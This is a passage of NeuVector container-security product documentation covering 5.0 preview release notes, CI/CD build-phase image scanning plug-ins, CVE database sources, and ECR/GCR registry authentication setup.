Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Tags for Enforcer, Manager, Controller: 5.0.0-b1 (e.g. neuvector/controller:5.0.0-b1)  Preview.3 version released March 2022​  important To update previous preview deployments for new CRD WAF, DLP and Admission control features, please update the CRD yaml and add new rbac/role bindings: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/latest/crd-k8s-1.19.yaml kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Enhancements​  Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet)CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. NOTE: Requires updated Rancher release (date/version TBD).Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.  Bug Fixes​  Fix issue of worker federation role backup should restore into non-federated clusters.  Preview.2 version released Feb 2022​  Minor file and license changes in source, no features added.  Support for deployment on AWS ECS Deprecated​  Support for deployment on ECS is no longer provided. The allinone should still be able to be deployed on ECS, however, the documentation of the steps and settings is no longer supported.  5.0 'Tech Preview' January 2022​  Enhancements​  First release of an unsupported, 'tech-preview' version of NeuVector 5.0 open source version.Add support for OWASP Top-10, WAF-like rules for detecting network attacks in headers or body. Includes support for CRD definitions of signatures and application to appropriate Groups.Removes Serverless scanning features.  Bug Fixes​  TBD  Other​  Helm chart v1.8.9 is published for 5.0.0 deployments. If using this with the preview version of 5.0.0 the following changes should be made to values.yml: Update the registry to docker.ioUpdate image names/tags to the preview version on Docker hubLeave the imagePullSecrets empty ","version":"Next 🚧","tagName":"h3"},{"title":"Build Phase Image Scanning","type":0,"sectionRef":"#","url":"/next/scanning/build","content":"","keywords":"","version":"Next 🚧"},{"title":"CI/CD Build Phase Vulnerability Scanning​","type":1,"pageTitle":"Build Phase Image Scanning","url":"/next/scanning/build#cicd-build-phase-vulnerability-scanning","content":" Scan for vulnerabilities during the build phase of the pipeline using plug-ins such as Jenkins, Azure Devops, Github Action, gitlab, Bamboo, and CircleCI, or use the REST API. NeuVector supports two types of build-phase scanning: registry and local. For registry scanning, the NeuVector controller and scanner must be able to connect to the registry to pull the image.  To trigger a build-phase scan, the plug-in (e.g. Jenkins) must be able to connect to the Controller or Allinone. Note: The default REST API port for plug-ins to call the scanner is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  Make sure there is a NeuVector scanner container deployed and properly configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separately from the allinone or controller, and is included in the sample deployment yaml files.  You can download the plug-in from the Jenkins Plug-in Manager. Other plug-ins are accessible through the catalogs of the build tool, or on the NeuVector github page. The Bamboo scanner is available at https://github.com/neuvector/bamboo-plugin/releases/tag/1.0.1. The CircleCI ORB is available at https://github.com/neuvector/circleci-orb and through the CircleCI ORB catalog.  Local Build-Phase Scanning​  For local scanning, the NeuVector scanner will try to scan the image on a local host (or a host reachable by the remote host docker command).  For Kubernetes or OpenShift-based local scanning, remove the commented-out section of the sample scanner deployment yaml file, shown in the Deploying NeuVector sections. The commented out section looks like this:   env: # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   For Docker-native local scanning, follow the instructions for Docker scanner deployments in the Docker Production deployments section for the scanner.  Local Build-Phase Scanning - Scanner Only (No Controller Required)​  NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). Certain plug-in's such as the CircleCI ORB have an option to dynamically deploy a scanner when a build job requires image scanning, then remove the scanner when the results are sent back through the ORB. These dynamic scanner deployments are automatically invoked through the plug-in if supported.  Please see the scanner section for more details on stand alone scanners. ","version":"Next 🚧","tagName":"h3"},{"title":"Azure DevOps","type":0,"sectionRef":"#","url":"/next/scanning/build/azuredevops","content":"","keywords":"","version":"Next 🚧"},{"title":"Scan for Vulnerabilities in the Azure DevOps Build Pipeline​","type":1,"pageTitle":"Azure DevOps","url":"/next/scanning/build/azuredevops#scan-for-vulnerabilities-in-the-azure-devops-build-pipeline","content":" The NeuVector scanner can be triggered from the Azure DevOps pipeline by using the NeuVector extension published in the Azure DevOps Marketplace.    The extension supports both remote and local scanning where the NeuVector controller can remotely scan an image in a registry during the build, or dynamically start a local controller to scan the image on the Azure agent vm.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Scan image with NeuVector task integrates the NeuVector vulnerability scanner into an Azure DevOps Pipeline.Perform vulnerability scans of a container image after the image build on an external NeuVector controller instance or on a local NeuVector controller instance which is running in service container inside a pipeline.Define thresholds for failing builds based on the number of detected vulnerabilities of different severities.Provide a detailed report of an image scan for analysis in the build summary tab.External NeuVector controller instances are defined as service endpoints to decouple build pipeline definitions from connection parameters and credentials.  An overview with sample screens can be found at https://marketplace.visualstudio.com/items?itemName=NeuVector.neuvector-vsts ","version":"Next 🚧","tagName":"h3"},{"title":"Bamboo","type":0,"sectionRef":"#","url":"/next/scanning/build/bamboo","content":"","keywords":"","version":"Next 🚧"},{"title":"Scan for Vulnerabilities during Bamboo Build Pipeline​","type":1,"pageTitle":"Bamboo","url":"/next/scanning/build/bamboo#scan-for-vulnerabilities-during-bamboo-build-pipeline","content":" The Bamboo plug-in for NeuVector can be used to scan for vulnerabilities in the Bamboo pipeline. The plug-in can be downloaded from the Admin -&gt; Add-ons menu in Bamboo. Use Find New Apps to search for NeuVector. The plug-in is also described in the Atlassian Marketplace.  Deploy the NeuVector Allinone or Controller container if you haven't already done so on a host reachable by Bamboo. Make a note of the IP address of the host where the Allinone or Controller is running.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Configure Global Settings​  Configure settings for the NeuVector Controller/Allinone including the NeuVector authentication as well as the registry authentication.  Configure the Repository and Build Policy​  Create a task and enter the repository and tag to scan as well as the build policy to fail the build if vulnerabilities are detected. Enable layered scanning if the results should contain an analysis of vulnerabilities for each layer in the image.  Review Results​  Review the results in the scan logs, including the scan summary, reason for failing if appropriate, and details for each CVE detected. ","version":"Next 🚧","tagName":"h3"},{"title":"GitHub","type":0,"sectionRef":"#","url":"/next/scanning/build/github","content":"","keywords":"","version":"Next 🚧"},{"title":"Scan for Vulnerabilities in a GitHub Action Pipeline​","type":1,"pageTitle":"GitHub","url":"/next/scanning/build/github#scan-for-vulnerabilities-in-a-github-action-pipeline","content":" The NeuVector scanner can be triggered from a GitHub Action pipeline by using the NeuVector Vulnerability Scan Actionpublished in the GitHub Action Marketplace.   ","version":"Next 🚧","tagName":"h3"},{"title":"CircleCI","type":0,"sectionRef":"#","url":"/next/scanning/build/circleci","content":"","keywords":"","version":"Next 🚧"},{"title":"Scan for Vulnerabilities in the CircleCI Build Pipeline​","type":1,"pageTitle":"CircleCI","url":"/next/scanning/build/circleci#scan-for-vulnerabilities-in-the-circleci-build-pipeline","content":" The NeuVector CircleCI ORB triggers a vulnerability scan on an image in the CircleCI pipeline. The ORB is available in the CircleCI catalog and is also documented on the NeuVector GitHub page.  Deploy the NeuVector Allinone or Controller container if you haven't already done so on a host reachable by the CircleCI ORB. Make a note of the IP address of the host where the Allinone or Controller is running.  The ORB supports two use cases:  Triggering the scan to be performed outside the CirclCI infrastructure. The ORB contacts the NeuVector scanner, which then pulls the image from a registry to be scanned. Make sure the ORB has network connectivity to the host where the NeuVector Controller/Allinone is running.Dynamically launching a NeuVector controller and scanner on a temporary vm running on the CircleCI platform. After launching and auto-configuring, the scan be done on image in the build, and after completion the NeuVector deployment is stopped and removed. For this use case, please see the documentation on the CircleCI ORB for NeuVector.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Create a Context in Your CircleCI App​    Configure Settings​  Configure the Environment Variables for Connecting to and Authenticating    Add the NeuVector orb to Your Build config.yaml  version: 2.1 orbs: neuvector: neuvector/neuvector-orb@1.0.0 workflows: scan-image: jobs: - neuvector/scan-image: context: myContext registry_url: https://registry.hub.docker.com repository: alpine tag: &quot;3.4&quot; scan_layers: false high_vul_to_fail: 0 medium_vul_to_fail: 3   The registry_url is the location to find the image to be scanned. Configure the repository name, tag, and if a layered scan should be performed. Add criteria for the build task to fail based on number of high or medium vulnerabilities detected.  Review the Results​  The build task will pass or fail based on the criteria set. In either case you can review the full scan report. ","version":"Next 🚧","tagName":"h3"},{"title":"Jenkins Details","type":0,"sectionRef":"#","url":"/next/scanning/build/jenkins","content":"","keywords":"","version":"Next 🚧"},{"title":"Detailed Configuration for the Jenkins Plugin​","type":1,"pageTitle":"Jenkins Details","url":"/next/scanning/build/jenkins#detailed-configuration-for-the-jenkins-plugin","content":" Containers provide an easy and efficient way to deploy applications. But container images may contain open source code over which you don't have a full control. Many vulnerabilities in open source projects have been reported, and you may decide to use these libraries with vulnerabilities or not after scanning the images and reviewing the vulnerability information for them.  The NeuVector Vulnerability Scanner Jenkins plugin can scan the images after your image is built in Jenkins. The plug-in source and latest documentation can be found here on the NeuVector GitHub page.  The plug-in supports two scan modes. The first is &quot;Controller &amp; Scanner&quot; mode. The second is the standalone scanner mode. You can select the scan mode in the project configuration page. By default, it uses the &quot;Controller &amp; Scanner&quot; mode.  For the &quot;Controller &amp; Scanner&quot; mode, you need to deploy the NeuVector controller and scanner in the network. To scan the local image (the image on the Jenkins machine), the &quot;Controller &amp; Scanner&quot; needs to be installed on the same node where the image exists.  For the standalone scanner mode, the Docker run-time must be installed on the same host with Jenkins. Also, add the jenkins user to the docker group.  sudo usermod -aG docker jenkins   Jenkins Plugin Installation​  First, go to Jenkins in your browser to search for the NeuVector plug-in. This can be found in:  -&gt; Manage Jenkins -&gt; Manage Plugins -&gt; Available -&gt; filter -&gt; search NeuVector Vulnerability Scanner -&gt;  Select it and click `install without restart.'  Deploy the NeuVector Controller and Scanner container if you haven't already done so on a host reachable by the Jenkins server. This can be on the same server as Jenkins if desired. Make a note of the IP address of the host where the Controller is running. Note: The default REST API port is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  In addition, make sure there is a NeuVector scanner container deployed standalone and configured to connect to the Controller (if Controller is being used).  There are two scenarios for image scanning, local and registry scanning.  Local Image Scan. If you use the plugin to scan local images (before pushing to any registries), you can scan on the same host as the controller/scanner or configure the scanner to access the docker engine on a remote host.Registry Image Scan. If you use the plugin to scan registry images (after pushing to any registries, but as part of the Jenkins build process), the NeuVector Scanner can be installed on any node in the network with connectivity between the registry, NeuVector Scanner, and Jenkins.  Global Configuration in Jenkins​  After installing the plugin, find the ‘NeuVector Vulnerability Scanner’ section in the global configuration page (Jenkins ‘Configure System’). Enter values for the NeuVector Controller IP, port, username, and password. You may click the ‘Test Connection’ button to validate the values. It will show ‘Connection Success’ or an error message.  The timeout minutes value will terminate the build step within the time entered. The default value of 0 means no timeout will occur.  Click the ‘Add Registry’ to enter values for the registry you will use in your project. If you will be only scanning local images, you don’t need to add a registry here.  Scenario 1: global configuration example for local image scan    Scenario 2: global configuration example for registry image scan  For global registry configuration, follow the instructions above for local, then add the registry details as below.    Standalone Scanner​  Running Jenkins scan in standalone mode is a lightweight way to scan image vulnerabilities in the pipeline. Scanner is dynamically invoked and no installaton of controller setup is required. This is especially useful when scaning an image before it is pushed to a registry. It also has no limit on how many scan tasks can run at the same time.  In order to run vulnerability scan in standalone mode, the Jenkins plugin need pull the scanner image to the host where the agent is running, so you need enter NeuVector Scanner registry URL, image repository, and the credential if needed, in NeuVector plugin configuration page.  The scan result can also be submitted to the controler and used in the admission control function. In this case, you do need a controller setup and specify how to connect to the controller in NeuVector plugin configuration page.  Local Configuration for scanning a remote Docker Host​  Prerequisites for Local Scan on a Remote Docker HostTo enable NeuVector to scan an image that is not on the same host as the controller/allinone:  Make sure the docker run-time api socket is exposed via TCPAdd the following environment variable to the controller/allinone: SCANNER_DOCKER_URL=tcp://192.168.1.10:2376  Project Configuration​  In your project, choose the 'NeuVector Vulnerability Scanner' plugin from the drop down menu in the 'Add build step.' Check the box &quot;Scan with Standalone scanner&quot; if you want to do the scan in the standalone scanner mode. By default, it uses &quot;Controller &amp; Scanner&quot; mode to do the scan.  Choose Local or a registry name which is the nickname you entered in global config. Enter the repository and image tag name to be scanned. You may choose Jenkins default environment variables for the repository or tag, e.g. $JOB_NAME, $BUILD_TAG, $BUILD_NUMBER. Enter the values for the number of high or medium, and for any name of the vulnerabilities present to fail the build.  After the build is finished, a NeuVector report will be generated. It will show the scan details and errors if any.  Scenario 1: local configuration example    Scenario 2: registry configuration example    Jenkins Pipeline​  For the Jenkins pipeline project, you may write your own pipeline script directly, or click the ‘pipeline syntax’ to generate the script if you are new to the pipeline style task.    Select the NeuVector Vulnerability Scanner from the drop-down, configure it, and Generate the script.    Copy the script into your Jenkins task script.  Scenario 1: Simple local pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'Local', repository: 'your_username/your_image' \\} ...   Scenario 2: Simple registry pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'your_registry', repository: 'your_username/your_image' \\} ...   Additional Stages​  Add your own pre- and post- image scan stages, for example in the Pipeline stage view example below.    You are now ready to start your Jenkins builds and trigger the NeuVector Vulnerability Scanner to report any vulnerabilities!  ","version":"Next 🚧","tagName":"h3"},{"title":"OpenShift Route and Registry Token Example​","type":1,"pageTitle":"Jenkins Details","url":"/next/scanning/build/jenkins#openshift-route-and-registry-token-example","content":" To configure the plug-in using an OpenShift route for ingress to the controller, add the route into the controller IP field.    To use token based authentication to the OpenShift registry, use NONAME as the user and enter the token in the password.  ","version":"Next 🚧","tagName":"h3"},{"title":"Special Use Case for Jenkins in the Same Kubernetes Cluster​","type":1,"pageTitle":"Jenkins Details","url":"/next/scanning/build/jenkins#special-use-case-for-jenkins-in-the-same-kubernetes-cluster","content":" To do build-phase scanning where the Jenkins software is running in the same Kubernetes cluster as the scanner, make sure the scanner and Jenkins are set to run on the same node. The node needs to be labeled so the Jenkins and scanner containers run on the same node because the scanner needs access to the local node's docker.sock to access the image. ","version":"Next 🚧","tagName":"h3"},{"title":"Gitlab","type":0,"sectionRef":"#","url":"/next/scanning/build/gitlab","content":"","keywords":"","version":"Next 🚧"},{"title":"Scan for Vulnerabilities during Gitlab Build Pipeline​","type":1,"pageTitle":"Gitlab","url":"/next/scanning/build/gitlab#scan-for-vulnerabilities-during-gitlab-build-pipeline","content":" NeuVector can be configured to scan for vulnerabilities triggered in the Gitlab build pipeline. There is a Gitlab plug-in here which can be configured and used. Please follow the instructions on the gitlab site for using the plugin.  The scan can also use the NeuVector REST API by configuring the provided script below to access the controller.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Scan During Gitlab Build Using REST API​  Use the following script, configured for your NeuVector login credentials to trigger the vulnerability scans.  ######################## # Scanning Job ######################## NeuVector_Scan: image: docker:latest stage: test #the runner tag name is nv-scan tags: - nv-scan services: - docker:dind before_script: - apk add curl - apk add jq variables: DOCKER_DAEMON_PORT: 2376 DOCKER_HOST: &quot;tcp://$CI_SERVER_HOST:$DOCKER_DAEMON_PORT&quot; #the name of the image to be scanned NV_TO_BE_SCANNED_IMAGE_NAME: &quot;nv_demo&quot; #the tag of the image to be scanned NV_TO_BE_SCANNED_IMAGE_TAG: &quot;latest&quot; #for local, set NV_REGISTRY=&quot;&quot; #for remote, set NV_REGISTRY=&quot;[registry URL]&quot; NV_REGISTRY_NAME: &quot;&quot; #the credential to login to the docker registry NV_REGISTRY_USER: &quot;&quot; NV_REGISTRY_PASSWORD: &quot;&quot; #NeuVector image location NV_IMAGE: &quot;10.1.127.3:5000/neuvector/controller&quot; NV_PORT: 10443 NV_LOGIN_USER: &quot;admin&quot; NV_LOGIN_PASSWORD: &quot;admin&quot; NV_LOGIN_JSON: '{&quot;password&quot;:{&quot;username&quot;:&quot;$NV_LOGIN_USER&quot;,&quot;password&quot;:&quot;$NV_LOGIN_PASSWORD&quot;}}' NV_SCANNING_JSON: '{&quot;request&quot;:{&quot;registry&quot;:&quot;$NV_REGISTRY&quot;,&quot;username&quot;:&quot;$NV_REGISTRY_NAME&quot;,&quot;password&quot;:&quot;$NV_REGISTRY_PASSWORD&quot;,&quot;repository&quot;:&quot;$NV_TO_BE_SCANNED_IMAGE_NAME&quot;,&quot;tag&quot;:&quot;$NV_TO_BE_SCANNED_IMAGE_TAG&quot;}}' NV_API_AUTH_URL: &quot;https://$CI_SERVER_HOST:$NV_PORT/v1/auth&quot; NV_API_SCANNING_URL: &quot;https://$CI_SERVER_HOST:$NV_PORT/v1/scan/repository&quot; script: - echo &quot;Start neuvector scanner&quot; - docker run -itd --privileged --name neuvector.controller -e CLUSTER_JOIN_ADDR=$CI_SERVER_HOST -p 18301:18301 -p 18301:18301/udp -p 18300:18300 -p 18400:18400 -p $NV_PORT:$NV_PORT -v /var/neuvector:/var/neuvector -v /var/run/docker.sock:/var/run/docker.sock -v /proc:/host/proc:ro -v /sys/fs/cgroup/:/host/cgroup/:ro $NV_IMAGE - | _COUNTER_=&quot;0&quot; while [ -z &quot;$TOKEN&quot; -a &quot;$_COUNTER_&quot; != &quot;12&quot; ]; do _COUNTER_=$((( _COUNTER_ + 1 ))) sleep 5 TOKEN=`(curl -s -f $NV_API_AUTH_URL -k -H &quot;Content-Type:application/json&quot; -d $NV_LOGIN_JSON || echo null) | jq -r '.token.token'` if [ &quot;$TOKEN&quot; = &quot;null&quot; ]; then TOKEN=&quot;&quot; fi done - echo &quot;Scanning ...&quot; - sleep 20 - curl $NV_API_SCANNING_URL -s -k -H &quot;Content-Type:application/json&quot; -H &quot;X-Auth-Token:$TOKEN&quot; -d $NV_SCANNING_JSON | jq . - echo &quot;Logout&quot; - curl $NV_API_AUTH_URL -k -X 'DELETE' -H &quot;Content-Type:application/json&quot; -H &quot;X-Auth-Token:$TOKEN&quot; after_script: - docker stop neuvector.controller - docker rm neuvector.controller  ","version":"Next 🚧","tagName":"h3"},{"title":"CVE Database Sources & Version","type":0,"sectionRef":"#","url":"/next/scanning/cve_sources","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector Vulnerability (CVE) Database​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/next/scanning/cve_sources#neuvector-vulnerability-cve-database","content":" The NeuVector vulnerability database is updated nightly with sources from popular container base images and package providers. These updates are automatically built into the updater container and published to the NeuVector private docker hub registry. The list of sources included is evaluated frequently to ensure the accuracy of scan results.  note You control when to update the CVE database in your deployment. Please see the section Updating the CVE Database for details on how to update.  important NeuVector is able to scan distroless and PhotonOS based images.  ","version":"Next 🚧","tagName":"h3"},{"title":"CVE Database Version​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/next/scanning/cve_sources#cve-database-version","content":" The CVE database version and date can be seen in the console in the Platforms, Registries, Vulnerabilities tab in Containers/Nodes in Assets, and Risk Reports Scan Events.  To use the REST API to query the version:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   To query the NeuVector scanner for the database version:  kubectl exec &lt;scanner pod&gt; -n neuvector -- scanner -v -d /etc/neuvector/db/   To use docker commands:  docker exec scanner scanner -v -d /etc/neuvector/db/   ","version":"Next 🚧","tagName":"h3"},{"title":"Querying the CVE Database for Specific CVE Existence​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/next/scanning/cve_sources#querying-the-cve-database-for-specific-cve-existence","content":" An online service is provided for NeuVector Prime (paid subscription) customers to be able to query the CVE database to determine if a specific CVE exists in the current database version. Other CVE database queries are also available from this service. Please request access through your SUSE Support portal (SCC), SUSE Collective link, or contact your SUSE account representative to access this service.  ","version":"Next 🚧","tagName":"h3"},{"title":"CVE Database Sources​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/next/scanning/cve_sources#cve-database-sources","content":" The most up-to-date list of CVE database sources can be found here  Sources include:  General CVE Feeds​  Source\tURLnvd and Mitre\thttps://nvd.nist.gov/feeds/json/cve/1.1  note NVD is a superset of CVE https://cve.mitre.org/about/cve_and_nvd_relationship.html  OS CVE Feeds​  Source\tURLalpine\thttps://secdb.alpinelinux.org/ amazon\thttps://alas.aws.amazon.com/ debian\thttps://security-tracker.debian.org/tracker/data/json Microsoft mariner\thttps://github.com/microsoft/CBL-MarinerVulnerabilityData Oracle\thttps://linux.oracle.com/oval/ Rancher OS\thttps://rancher.com/docs/os/v1.x/en/about/security/ redhat\thttps://www.redhat.com/security/data/oval/v2/ SUSE linux\thttps://ftp.suse.com/pub/projects/security/oval/ ubuntu\thttps://launchpad.net/ubuntu-cve-tracker  Application Based Feeds​  Source\tURL.NET\thttps://github.com/advisories, https://www.cvedetails.com/vulnerability-list/vendor_id-26/ apache\thttps://www.cvedetails.com/vendor/45/Apache.html busybox\thttps://www.cvedetails.com/vulnerability-list/vendor_id-4282/Busybox.html golang\thttps://github.com/advisories java\thttps://openjdk.java.net/groups/vulnerability/advisories/ github maven\thttps://github.com/advisories?query=maven kubernetes\thttps://kubernetes.io/docs/reference/issues-security/official-cve-feed/ nginx\thttp://nginx.org/en/security_advisories.html npm/nodejs\thttps://github.com/advisories?query=ecosystem%3Anpm python\thttps://github.com/pyupio/safety-db openssl\thttps://www.openssl.org/news/vulnerabilities.html ruby\thttps://github.com/rubysec/ruby-advisory-db  ","version":"Next 🚧","tagName":"h3"},{"title":"Scanner Accuracy​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/next/scanning/cve_sources#scanner-accuracy","content":" NeuVector evaluates each source to determine how to most accurately scan for vulnerabilities. It is common for scan results from different vendors' scanners to return different results. This is because each vendor processes the sources differently.  A higher number of vulnerabilities detected by one scanner is not necessarily better than another. This is because there can be false positives which return inaccurate vulnerability results.  NeuVector supports both layered and non-layered (compacted) scan results for images. The layered scan shows vulnerabilities in each layer, while the non-layered shows only vulnerabilities at the surface.  ","version":"Next 🚧","tagName":"h3"},{"title":"Scanner Performance​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/next/scanning/cve_sources#scanner-performance","content":" A number of factors determine scanner performance. For registry scanning, the number and size of images as well as if a layered scan is being performed will determine performance. For run-time scans, the collection of container data is distributed across all Enforcers, then scheduled by the Controller for database comparison.  Multiple parallel scanners can be deployed to increase scan performance for a large number of images. The controller will schedule scan tasks across all scanners. Each scanner is a container which is deployed by a Kubernetes deployment/replicaset. ","version":"Next 🚧","tagName":"h3"},{"title":"ECR Scanning using IAM Roles","type":0,"sectionRef":"#","url":"/next/scanning/registry/ecr-iam","content":"","keywords":"","version":"Next 🚧"},{"title":"AWS ECR - IAM Roles​","type":1,"pageTitle":"ECR Scanning using IAM Roles","url":"/next/scanning/registry/ecr-iam#aws-ecr---iam-roles","content":" When the NeuVector containers are deployed in AWS, and an EC2 instance is assigned a role of “EC2 Container Registry” Read Access, the AWS ECR registry can be scanned without an Access Key and Secret Key.  Here is how to create an AWS role and assign it to the node.  Select the Instance​  Note that the IAM role is either blank or does not include the ECR role    Attach a Role​  Select Actions -&gt; Instance Settings -&gt; Attach/Replace IAM Role    If you have not previously created the ECR role, click Create New IAM Role. Enter the role name.    Select the AWS Service​    List of Roles​    Attach the ECR Read Permission to the Role​    Review Your Settings​    Check the Instance for IAM Role​   ","version":"Next 🚧","tagName":"h3"},{"title":"GCR Scanning using Service Accounts","type":0,"sectionRef":"#","url":"/next/scanning/registry/gcr-sa","content":"","keywords":"","version":"Next 🚧"},{"title":"Google GCR - Authentication/Scanning with GCP Service Accounts​","type":1,"pageTitle":"GCR Scanning using Service Accounts","url":"/next/scanning/registry/gcr-sa#google-gcr---authenticationscanning-with-gcp-service-accounts","content":" It is a best practice to not depend on user attributed accounts for integrations. GCP supports using a service account to access GCR. Here are the steps to enable a service account for GCR and use it to trigger repository scans from NeuVector.  Start in NeuVector, where one first sets up a new registry:    By selecting Google Container Registry as the repo type, this panel is customized to accept the input required to use your GCR.  Name - Here’s where you give this particular repo entry a name of your choosing. It’s merely to identify it in the NeuVector interface later on.Registry - This is the first place where you’ll want to be sure the correct data is collected from your GCR instance. While the example of https://gcr.io is the most common, we will want to be sure it accurately reflects how your GCR was set up in GCP. It might be https://us.gcr.io for example. We’ll go check it in the next section.JSON Key - As is pretty self-evident, this will be a JSON-formatted key. And, as you’re probably seeing a pattern set up for, we’ll be finding that via GCP.Filter - Be mindful that you will likely need to replace any filters here with the actual name of the repo. Again, that’s in the GCR interface.   Now let’s head on over to that GCR screen in GCP. Much of what we need is right here on this page.  A. See the “gcr.io” under Hostname? That’s what belongs in item #2, Registry in the NeuVector interface. (Don’t forget the https:// part) B. The ID of the repo is actually under the top level project. This is what you will be using in #3, Filter. See example of env-demo below.    The JSON Key leads us to explore another very important step, and that takes us to the IAM &amp; Admin section of GCP where we will create (or confirm the setting of) a Service Account. See below:    Once you enter the data for the first step of creating a service account, you need to press the “CREATE” button to get step 2 to be willing to accept input.    Be sure to select Basic —&gt; Viewer for the access. If you have an existing service account, ensure that the access is set this way. (Hint: Even access permissions that appear to be more powerful don’t seem to allow for proper access. Don't skip this step.  Once you’ve done this step, you can breeze past Step 3 and proceed with creating the Service Account.  If you don’t immediately land on the info panel for your new service account, be sure to go there on the Service Accounts list. See figure 5 below.    Click “ADD KEY” —&gt; “Create New Key”    As you have already concluded, JSON is the go-to here. Selecting “CREATE” will result in a file that you can download in your browser. The contents of this file should be pasted into the 3, JSON Key field in NeuVector; see figure 1.  Before you get too excited there’s one more thing to ensure. In order for the scanner in NeuVector to use the API to scan and protect your images, said API must be enabled in your GCP account. You can either enable it via the command line via  gcloud services enable artifactregistry.googleapis.com   Or you can use the GCP gui. Head to “API Library” and search for “Artifact Registry API” and ensure it is turned on for your project. See figure 7.    You should be set! See figure 8 below for a properly-configured registry using the data from our example:    Obtain the Access Token Using the REST API​  The NeuVector REST API may be used to authenticate using the service account. The below example uses gcloud to obtain the access token. The username is “oauth2accesstoken”.  gcloud auth print-access-token 